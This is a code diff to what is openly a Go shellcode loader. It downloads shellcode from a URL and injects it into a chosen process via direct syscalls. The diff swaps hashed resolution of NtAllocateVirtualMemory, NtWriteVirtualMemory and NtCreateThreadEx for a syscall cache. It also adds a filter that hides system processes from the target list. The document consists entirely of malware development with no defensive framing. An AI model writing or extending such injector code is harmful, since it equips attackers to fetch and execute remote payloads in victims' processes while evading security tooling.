@@ -438,11 +438,17 @@ func directSyscallInjector(payload []byte, pid uint32) error {
 }
 
 func main() {
-	// Hash initialization - precompute hashes for common API calls
-	winapi.GetFunctionHash("ntdll.dll")
-	winapi.GetFunctionHash("NtAllocateVirtualMemory")
-	winapi.GetFunctionHash("NtWriteVirtualMemory")
-	winapi.GetFunctionHash("NtCreateThreadEx")
+
+	// Prewarm the syscall cache :3
+	if cacheErr := winapi.PrewarmSyscallCache(); cacheErr != nil {
+		fmt.Printf("Warning: Failed to prewarm cache: %v\n", cacheErr)
+	}
+
+	
+	// Display cache statistics
+	stats := winapi.GetSyscallCacheStats()
+	fmt.Printf("Syscall cache initialized - Size: %v, Algorithm: %v\n", 
+		stats["cache_size"], stats["hash_algorithm"])
 	
 	// Parse command line flags
 	urlFlag := flag.String("url", "", "URL to download shellcode from")
@@ -570,16 +576,45 @@ func main() {
 	}
 	
 	// Get list of accessible processes
-	processes, err := getProcessList()
+	allProcesses, err := getProcessList()
 	if err != nil {
 		fmt.Printf("Failed to get process list: %v\n", err)
 		return
 	}
 	
+	// Always filter out system processes for cleaner user experience
+	systemProcesses := []string{
+		"system", "smss.exe", "csrss.exe", "wininit.exe", "winlogon.exe",
+		"services.exe", "lsass.exe", "svchost.exe", "dwm.exe", "explorer.exe",
+		"fontdrvhost.exe", "sihost.exe", "taskhostw.exe", "conhost.exe",
+		"dllhost.exe", "ctfmon.exe", "perfhost.exe", "audiodg.exe",
+		"runtimebroker.exe", "searchindexer.exe", "searchfilterhost.exe",
+		"searchprotocolhost.exe", "searchapp.exe", "startmenuexperiencehost.exe",
+		"shellexperiencehost.exe", "textinputhost.exe", "applicationframehost.exe",
+		"wmiprvse.exe", "vssvc.exe", "registry", "secure system",
+		"lsaiso.exe", "credentialenrollmentmanager.exe", "compkgsrv.exe",
+	}
+	
+	var processes []ProcessInfo
+	for _, proc := range allProcesses {
+		isSystem := false
+		for _, sysProc := range systemProcesses {
+			if strings.EqualFold(proc.Name, sysProc) {
+				isSystem = true
+				break
+			}
+		}
+		if !isSystem {
+			processes = append(processes, proc)
+		}
+	}
+	
 	if len(processes) == 0 {
-		fmt.Println("No accessible processes found")
+		fmt.Println("No user processes found.")
 		return
 	}
+	
+	fmt.Printf("Showing %d user processes (system processes hidden :3)\n", len(processes))
 	
 	var selectedProcess ProcessInfo
 	
